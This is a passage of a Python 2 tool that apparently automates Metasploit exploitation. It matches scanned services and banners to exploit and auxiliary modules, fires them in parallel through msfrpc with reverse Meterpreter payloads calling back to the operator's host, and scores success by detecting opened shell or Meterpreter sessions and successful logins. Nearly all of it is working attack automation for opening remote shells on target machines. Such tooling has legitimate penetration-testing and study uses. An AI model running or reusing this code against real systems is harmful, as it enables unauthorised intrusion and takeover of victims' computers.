             if str(portNo)!="80":
              if [hostNo+":"+portNo,moduleCategory+"/"+moduleName,startCount] not in tmpList1:
               tmpList1.append([hostNo+":"+portNo,moduleCategory+"/"+moduleName,startCount])
              if startCount<maxCount:
               startCount+=1
              else:
               startCount=0

 	 if len(tmpList1)>0:
 	  runMultipleAuxExploits(tmpList1)

	if execMethod=="all" or execMethod=="services":
 	 if len(manualExpList):
	  tmpList=[]
	  print "\n**** List of Modules to Run Manually ****"
          if intelligentMode==True:
 	   for x in manualExpList:
            if "windows" not in x[3] and "linux" not in x[3] and "unix" not in x[3] and "osx" not in x[3] and "solaris" not in x[3]:
             if [x[0]+":"+x[1],x[2]+"/"+x[3],x[4]] not in tmpList:
    	       tmpList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
	       runManualList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
            else:
             for y in osList:
              osType=y[1]
              if osType in x[3]:
               if [x[0]+":"+x[1],x[2]+"/"+x[3],x[4]] not in tmpList:
     	        tmpList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
           if len(tmpList)>0:
            print tabulate(tmpList)
           else:
            print "No results found"
         else:
           if len(manualExpList)>0:
            print tabulate(manualExpList, headers=["Host","Metasploit Module","Parameters"])
           #else:
           # print "No results found"


def runPortBasedModules():
	if execMethod=="all" or execMethod=="ports":
 	 message = "\n**** Finding MSF Modules based on Service Name ****"
	 autoExpListAux=[]
	 autoExpListExp=[]
	 tmpautoExpListAux=[]
	 tmpautoExpListExp=[]
	 tmpmanualExpList=[]
	 for x in targetList:
	  hostNo=x[0]
	  portNo=x[1]
	  portProtocol=x[2]
	  tmpResultList=lookupPortDB(portNo,portProtocol)
 	  found=False
	  for y in tmpResultList:
           portNo=y[0]
           moduleType=y[1]
           moduleName=y[2]
           moduleParameters=y[3]
           moduleDescription=y[4]
	   if intelligentMode==True:
 	    for z in uniqueSvcBannerList:
	     tmpIP=z[0]
	     tmpPort=z[1]
	     tmpSvcBanner=z[2]
             if(hostNo==tmpIP and str(portNo)==str(tmpPort)):
              if tmpSvcBanner.lower() in moduleDescription.lower():
               if moduleParameters=="":
                if moduleType=='auxiliary':
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
		  found=True
                  autoExpListAux.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                if moduleType=='exploit':
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
		  found=True
                  autoExpListExp.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
               else:
                if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in manualExpList:
		 found=True
                 manualExpList.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
              else:
               #if unable to find keyword match in intelligentMode, add to tmpList, if no match at all then run all modules based on port no
               if tmpSvcBanner in moduleDescription:
                if moduleParameters=="":
                 if moduleType=='auxiliary':
                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in tmpautoExpListAux:
                   tmpautoExpListAux.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                 if moduleType=='exploit':
                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in tmpautoExpListExp:
                   tmpautoExpListExp.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                else:
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in tmpmanualExpList:
                  tmpmanualExpList.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
            if found==False:
   	     for z in uniqueSvcNameList:
	      tmpIP=z[0]
	      tmpPort=z[1]
	      tmpSvcBanner=z[2]
              if(hostNo==tmpIP and str(portNo)==str(tmpPort)):
               if tmpSvcBanner.lower() in moduleDescription.lower():
                if moduleParameters=="":
                 if moduleType=='auxiliary':
                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
	 	   found=True
                   autoExpListAux.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                 if moduleType=='exploit':
                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
		   found=True
                   autoExpListExp.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                else:
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in manualExpList:
		  found=True
                  manualExpList.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
              else:
               #if unable to find keyword match in intelligentMode, add to tmpList, if no match at all then run all modules based on port no
               if tmpSvcBanner in moduleDescription:
                if moduleParameters=="":
                 if moduleType=='auxiliary':
                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in tmpautoExpListAux:
                   tmpautoExpListAux.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                 if moduleType=='exploit':
                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in tmpautoExpListExp:
                   tmpautoExpListExp.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                else:
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in tmpmanualExpList:
                  tmpmanualExpList.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
           else:
               if moduleParameters=="":
                if moduleType=='auxiliary':
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                  autoExpListAux.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                if moduleType=='exploit':
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                  autoExpListExp.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
               else:
                if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in manualExpList:
                 manualExpList.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
           if found==False and intelligentMode==True:
            for y in tmpmanualExpList:
	     manualExpList.append(y)
            for y in tmpautoExpListExp:
	     autoExpListExp.append(y)
            for y in tmpautoExpListAux:
	     autoExpListAux.append(y)
  	    tmpautoExpListAux=[]
	    tmpautoExpListExp=[]
	    tmpmanualExpList=[]

         if len(manualExpList)<1 and len(autoExpListAux)<1 and len(autoExpListExp)<1:
 	  print "No Metasploit modules found matching criteria"

	 message = "\n**** Finding MSF Modules based on Port No ****"
	 print(setColor(message, bold, color="red"))

	 #Displaying the list of modules to be run against the target automatically
         tmpList=[]
	 if len(autoExpListExp)>0:
          tmpautoExpListExp=autoExpListExp
          autoExpListExp=[]
          for x in tmpautoExpListExp:
           hostNo=x[0]
           portNo=x[1]
	   moduleCategory=x[2]
	   moduleName=x[3]
	   moduleParameters=x[4]
           moduleDescription=x[5]
	   if filterModuleName(moduleName)==True:
            if str(portNo)!="80":
             if intelligentMode==True:
   	       for h in uniqueSvcBannerList:
                if h[2].lower() in moduleDescription.lower() and hostNo==h[0] and portNo==str(h[1]):
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                    autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0] in hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                        autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                if h[2].lower() in moduleName.lower() or h[2].lower() in moduleName.replace("_","").lower() and (hostNo==h[0] and portNo==str(h[1])):
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                    autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0] in hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                        autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])

               for h in uniqueSvcNameList:
                if h[2].lower() in moduleDescription.lower() and hostNo==h[0] and portNo==str(h[1]):
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                    autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0]==hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                        autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                if (h[2].lower() in moduleName.lower() or h[2].lower() in moduleName.replace("_","").lower()) and (hostNo==h[0] and portNo==h[1]):
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                    autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0] in hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                        autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
             else:
              tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
              if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
               autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])

	 #Testing auxiliary modules
	 if len(autoExpListAux)>0:
          tmpautoExpListAux=autoExpListAux
          autoExpListAux=[]
          for x in tmpautoExpListAux:
           hostNo=x[0]
           portNo=x[1]
	   moduleCategory=x[2]
	   moduleName=x[3]
	   moduleParameters=x[4]
           moduleDescription=x[5]
	   if filterModuleName(moduleName)==True:
            if str(portNo)!="80":
             if intelligentMode==True:
   	       for h in uniqueSvcBannerList:
                if h[2].lower() in moduleDescription.lower() and hostNo==str(h[0]) and portNo==str(h[1]):
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                    autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0] in hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                        autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                #if h[2].lower() in moduleName.lower() or h[2].lower() in moduleName.replace("_","").lower() and (hostNo==h[0] and portNo==h[1]):
                if h[2].lower() in moduleName.lower():
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                    autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0] in hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                        autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
               for h in uniqueSvcNameList:
                if h[2].lower() in moduleDescription.lower() and hostNo==str(h[0]) and portNo==str(h[1]):
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                    autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0] in hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                        autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                if (h[2].lower() in moduleName.lower() or h[2].lower() in moduleName.replace("_","").lower()) and (hostNo==h[0] and portNo==h[1]):
                 if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                    autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                 else:
                  if len(osList)>0:
                   for y in osList:
                    if y[0] in hostNo:
                     osType=y[1]
   	             if osType in moduleName:
                      if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                       tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                        autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
             else:
              tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
              if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
               autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])

         if len(tmpList)>0:
          print tabulate(tmpList, headers=["Host","Category","Metasploit Module"])
 	 else:
	  print "No results found"


  	 #Running the list of 'automated' moduels against target
	 #Running 'exploit' modules
         if len(autoExpListExp)>0 or len(autoExpListAux)>0:
 	  print "\n**** Test Results from Metasploit Modules ****"
          print "Please wait ..."
	 if len(autoExpListExp)>0 and showOnly==False:
	  tmpList1=[]
	  maxCount=numOfThreads
          startCount=0
	  for x in autoExpListExp:
           hostNo=x[0].split(":")[0]
           portNo=x[0].split(":")[1]
	   moduleCategory=x[1]
	   moduleName=x[2]
	   moduleParameters=x[3]
	   if filterModuleName(moduleName)==True:
            if str(portNo)!="80":
              tmpList1.append([hostNo+":"+portNo,moduleCategory+"/"+moduleName,startCount])
              if startCount==maxCount-1:
               startCount=0
              else:
               startCount+=1
 	  runMultipleAuxExploits(tmpList1)

	 #Running 'auxiliary' modules
	 if len(autoExpListAux)>0 and showOnly==False:
	  tmpList1=[]
	  maxCount=numOfThreads
	  startCount=0
	  for x in autoExpListAux:
           hostNo=x[0].split(":")[0]
           portNo=x[0].split(":")[1]
	   moduleCategory=x[1]
	   moduleName=x[2]
 	   moduleParameters=x[3]
 	   if filterModuleName(moduleName)==True:
            if str(portNo)!="80":
  	     tmpList1.append([hostNo+":"+str(portNo),moduleCategory+"/"+moduleName,startCount])
             #tmpChunkList.append([hostNo,moduleName,startCount])
             if startCount==maxCount-1:
              startCount=0
             else:
              startCount+=1
	  runMultipleAuxExploits(tmpList1)

         if len(manualExpList)>0:
	  message="\n**** List of Modules to Run Manually ****"
  	  #message="\nOther possible Metasploit modules.  Please run the modules manually due to additional inputs required"
	  print(setColor(message, bold, color="red"))
	  if intelligentMode==True:
           tmpManualExpList=[]
           for x in manualExpList:
            hostNo=x[0]
	    portNo=x[1]
            moduleType=x[2]
            moduleName=x[3]
            moduleParameters=x[4]
            if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
	     if [hostNo+":"+portNo,moduleType,moduleName,moduleParameters] not in tmpManualExpList:
              tmpManualExpList.append([hostNo+":"+portNo,moduleType,moduleName,moduleParameters])
            else:
             if len(osList)>0:
              for y in osList:
               if y[0] in hostNo:
                osType=y[1]
                if osType in moduleName:
                 if [hostNo+":"+portNo,moduleType,moduleName,moduleParameters] not in tmpManualExpList:
                  tmpManualExpList.append([hostNo+":"+portNo,moduleType,moduleName,moduleParameters])
           if len(tmpManualExpList)>0:
      	    print tabulate(tmpManualExpList, headers=["Host","Type","Module","Parameters"])
           else:
 	    print "No results found"
          else:
           tmpManualExpList=[]
           for x in manualExpList:
            tmpManualExpList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
    	   if len(tmpManualExpList)>0:
            print tabulate(tmpManualExpList, headers=["Host","Module","Parameters"])
           else:
 	    print "No results found"
	  tmpList=[]
  	  print "\n"

def runAuxModule1(input):
 global catchDupSessionList
 host=input[0][0]
 hostNo=host.split(":")[0]
 portNo=host.split(":")[1]
 moduleName=input[0][1]
 msfPortIncrement=input[0][2]

 results=""
 tmpList=[]
 tmpList.append([hostNo+":"+portNo,moduleName])
 tmpList=[]
 randomSrvPort=str(random.randint(10000,20000))
 randomLPort=str(random.randint(20001,30000))
 randomCPort=str(random.randint(30001,40000))
 RHOST=hostNo
 LHOST=msfIP

 complete=False
 while complete==False:
  try:
   import msfrpc
   msfrpc = reload(msfrpc)
   opts={}
   opts['host']='127.0.0.1'
   #here
   msfPortIncrement=0
   opts['port']=msfPort+msfPortIncrement
   opts['uri']='/api/'
   opts['ssl']=False
   client2 = msfrpc.Msfrpc(opts)
   client2.login('msf', mypassword)
   #res1 = client2.call("console.list")
   #print res1
   res2 = client2.call('console.create')
   console_id = res2['id']
   payloadStr=''
   payloadList=[]
   #moduleOptions=client2.call('module.options',["exploit",moduleName])
   #for key, value in moduleOptions.iteritems()
   # print key+"\t"+str(value)

   if "auxiliary" not in moduleName:
    tmpPayloadList=client2.call('module.compatible_payloads',[moduleName])
    watchList=[]
    watchList.append("linux/x86/meterpreter/reverse_tcp")
    watchList.append("php/meterpreter_reverse_tcp")
    watchList.append("python/meterpreter_reverse_https")
    watchList.append("java/meterpreter/reverse_https")
    watchList.append("windows/meterpreter/reverse_https")
    payloadList=[]
    for y in tmpPayloadList['payloads']:
     payloadStr=''
     for z in watchList:
      if z==y:
       payloadStr=z
       randomLPort=str(random.randint(40000,50000))
       #payloadStr='set payload '+payloadStr+'\n set LHOST '+localIP+'\n set LPORT '+str(randomLPort+'\n set VERBOSE true')
       payloadStr='set payload '+payloadStr+'\n set LHOST '+localIP+'\n set LPORT '+str(randomLPort+'\n set CPORT '+str(randomCPort)+' \n set VERBOSE false')
       payloadList.append(payloadStr)
   cmdStr=''
   if len(payloadList)<1:
    payloadList.append('set LHOST '+localIP+'\n set LPORT '+str(randomLPort)+'\n set CPORT '+str(randomCPort)+' \n set VERBOSE false')
   for payloadStr in payloadList:
    randomSrvPort=str(random.randint(10000,30000))
    commands = """use """+moduleName+"""
            set RHOST """+RHOST+"""
            set RHOSTS """+RHOST+"""
	    set RPORT """+portNo+"""
            set SRVPORT """+randomSrvPort+"""
            """+payloadStr+"""
            exploit -jz
            """
    cmdStr=cmdStr+' '+commands
   client2.call('console.write',[console_id,cmdStr])
   startTime = time.time()
   taskComplete=False
   while taskComplete==False:
    res2 = client2.call('console.read',[console_id])
    if len(res2['data']) > 1:
     results+=res2['data']
    if res2['busy'] == True:
     if quickMode==True:
      taskComplete=True
    #if (nowTime-startTime)>15:
    #if (nowTime-startTime)>80:
    nowTime = time.time()
    if (nowTime-startTime)>15:
     taskComplete=True
   if quickMode==False:
    #client2.call('console.session_kill',[console_id])
    client2.call('console.destroy',[console_id])
   complete=True
  except Exception as e:
   #print "Retrying: "+moduleName
   #print "error999: "+str(e)
   pass
  return [hostNo+":"+portNo,moduleName,results,[randomCPort,randomLPort,randomSrvPort]]

def runMultipleAuxExploits(tmpList):
    global catchDupSessionList
    tmpResultList=[]
    splitUrlList=list(chunk(tmpList, chunkSize))
    maxCount=numOfThreads
    startCount=0
    for chunkList in splitUrlList:
     p = multiprocessing.Pool(numOfThreads)
     tmpChunkList=[]
     for y in chunkList:
      hostNo=y[0]
      moduleName=y[1]
      if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
       tmpChunkList.append(y)
      else:
       if len(osList)>0:
        for x in osList:
         if x[0] in hostNo:
          osType=x[1]
   	  if osType in moduleName:
           tmpChunkList.append([hostNo,moduleName,startCount])
	   if startCount==maxCount-1:
	    startCount=0
           else:
            startCount+=1
       else:
        tmpChunkList.append([hostNo,moduleName,startCount])
	if startCount==maxCount-1:
	 startCount=0
        else:
         startCount+=1
     tmpResultList = p.map(runAuxModule1,itertools.izip(tmpChunkList))
     tmpResultList1=[]
     p.close()
     p.join()
     p.terminate()
     count=0
     totalCount=len(chunkList)
     for z in tmpResultList:
      tmpList=[]
      tmpList1=[]
      tmpList2=[]
      hostNo=z[0]
      moduleName=z[1]
      tmpList.append([hostNo,moduleName])

      moduleResults=z[2]
      cPort=z[3][0]
      lPort=z[3][1]
      sPort=z[3][2]
      moduleResults=escape_ansi(moduleResults)
      moduleResultsList=moduleResults.split("\n")
      exploitOK=False
      count=0
      tmpList2=[]
      msfResultSize=len(moduleResultsList)
      for x in moduleResultsList:
       x=escape_ansi(x)
       if "[*]" in x or "[-]" in x or "[+]" in x:
        if x not in tmpList1:
         tmpList1.append(x)
       count+=1
      if len(tmpList1)>0:
       if "LOGIN SUCCESSFUL" in str(tmpList1):
        exploitOK=True
       for y in tmpList1:
        if "Command shell session" in y or "Meterpreter session" in y:
         #print "here: "+str(cPort)+"\t"+str(sPort)+"\t"+str(lPort)
         if ":"+str(cPort) in str(y):
  	  exploitOK=True
         if ":"+str(sPort) in str(y):
	  exploitOK=True
         if ":"+str(lPort) in str(y):
	  exploitOK=True
         if "opened" in y and exploitOK==True:
          tmpList2.append(y)
        else:
          tmpList2.append(y)

       if exploitOK==True:
        if "auxiliary" in moduleName:
          if exploitOK==True:
           print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
           if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
      	    workingExploitList.append([tmpList[0][0],tmpList[0][1]])
          else:
           print tabulate(tmpList, tablefmt="plain")+" "+setColor('', bold, color="blue")
        else:
         print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
         if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
 	  workingExploitList.append([tmpList[0][0],tmpList[0][1]])
        if verbose==True:
         for y in tmpList1:
          print y
         print "\n"

       else:
        if quickMode==False:
         if "auxiliary" in moduleName:
          if exploitOK==True:
           print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
           if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
    	    workingExploitList.append([tmpList[0][0],tmpList[0][1]])
          else:
           print tabulate(tmpList, tablefmt="plain")+" "+setColor('', bold, color="red")
         else:
          print tabulate(tmpList, tablefmt="plain")+" "+setColor('[FAILED]', bold, color="red")
        else:
         print tabulate(tmpList, tablefmt="plain")+" "+setColor('[Check Msfconsole]', bold, color="red")
        if verbose==True:
         for y in tmpList2:
          print y
         print "\n"


def runMsfExploitsAndDisplayreport(tmpPathResultList):
     	p = multiprocessing.Pool(numOfThreads)
     	tmpResultList = p.map(runAuxModule1,itertools.izip(tmpPathResultList))
     	tmpResultList1=[]
     	p.close()
     	p.join()
     	p.terminate()
     	count=0
     	totalCount=len(tmpPathResultList)
     	for z in tmpResultList:
     	 tmpList=[]
     	 tmpList1=[]
     	 tmpList2=[]
     	 hostNo=z[0]
     	 moduleName=z[1]
     	 tmpList.append([hostNo,moduleName])

     	 moduleResults=z[2]
         cPort=z[3][0]
         lPort=z[3][1]
         sPort=z[3][2]
     	 moduleResults=escape_ansi(moduleResults)

      	 moduleResultsList=moduleResults.split("\n")
      	 exploitOK=False
	 tmpList2=[]
      	 for x in moduleResultsList:
      	  x=escape_ansi(x)
      	  if "[*]" in x or "[-]" in x or "[+]" in x:
           if x not in tmpList1:
            tmpList1.append(x)
         if len(tmpList1)>0:
          #print str(cPort)+"\t"+str(lPort)+"\t"+str(sPort)
          if "LOGIN SUCCESSFUL" in str(tmpList1):
           exploitOK=True
          #foundSession=False
	  # tmpList2=tmpList1
          for y in tmpList1:
           if "Command shell session" in y or "Meterpreter session" in y:
            #print "here: "+str(cPort)+"\t"+str(sPort)+"\t"+str(lPort)
            if ":"+str(cPort) in str(y):
  	     exploitOK=True
            if ":"+str(sPort) in str(y):
	     exploitOK=True
            if ":"+str(lPort) in str(y):
	     exploitOK=True
            if "opened" in y and exploitOK==True:
             tmpList2.append(y)
           else:
            tmpList2.append(y)

         if exploitOK==True:
          print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
          if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
  	   workingExploitList.append([tmpList[0][0],tmpList[0][1]])
       	  if verbose==True:
           if len(tmpList2)>0:
            for y in tmpList2:
             print y
            print "\n"
     	 else:
           if quickMode==False:
            print tabulate(tmpList, tablefmt="plain")+" "+setColor('[FAILED]', bold, color="red")
           else:
            print tabulate(tmpList, tablefmt="plain")+" "+setColor('[Check Msfconsole]', bold, color="red")
       	   if verbose==True:
            if len(tmpList2)>0:
             for y in tmpList2:
              print y
             print "\n"


def createDB():
 conn = sqlite3.connect('msfHelper.db')
 conn.text_factory = str
 try:
   conn.execute('''CREATE TABLE pathList
       (uriPath      TEXT            NOT NULL,
        moduleType   TEXT            NOT NULL,
        moduleName   TEXT UNIQU      NOT NULL,
        moduleParameters TEXT        NOT NULL,
        moduleDescription TEXT       NOT NULL);''')
 except Exception as e:
  pass
 try:
  conn.execute('''CREATE TABLE portList
  (portNo       TEXT          NOT NULL,
  moduleType    TEXT          NOT NULL,
  moduleName    TEXT UNIQUE   NOT NULL,
  moduleParameters  TEXT       NOT NULL,
  moduleDescription TEXT       NOT NULL);''')
 except Exception as e:
  pass
 conn.commit()
 conn.close()

def filterModuleName(moduleName):
 if not moduleName.startswith('admin/') and not moduleName.startswith('post/') and 'fuzzers' not in moduleName and 'auxiliary/server' not in moduleName and '_dos' not in moduleName and 'spoof/' not in moduleName and 'auxiliary/fuzzers' not in moduleName and 'scanner/portscan' not in moduleName and 'server/' not in moduleName and 'analyze/' not in moduleName and 'scanner/discovery' not in moduleName and 'fuzzers/' not in moduleName and 'server/capture/' not in moduleName and '/browser/' not in moduleName and 'dos/' not in moduleName and '/local/' not in moduleName and 'bof' not in moduleName and 'fileformat' not in moduleName:
  return True
 else:
  return False

def displayPortInfo(tmpList1):
   for x in tmpList1:
    try:
     portNo,portName,portDesc=extractPortInfo([x[0],x[1]])
     if portName==None and portDesc==None:
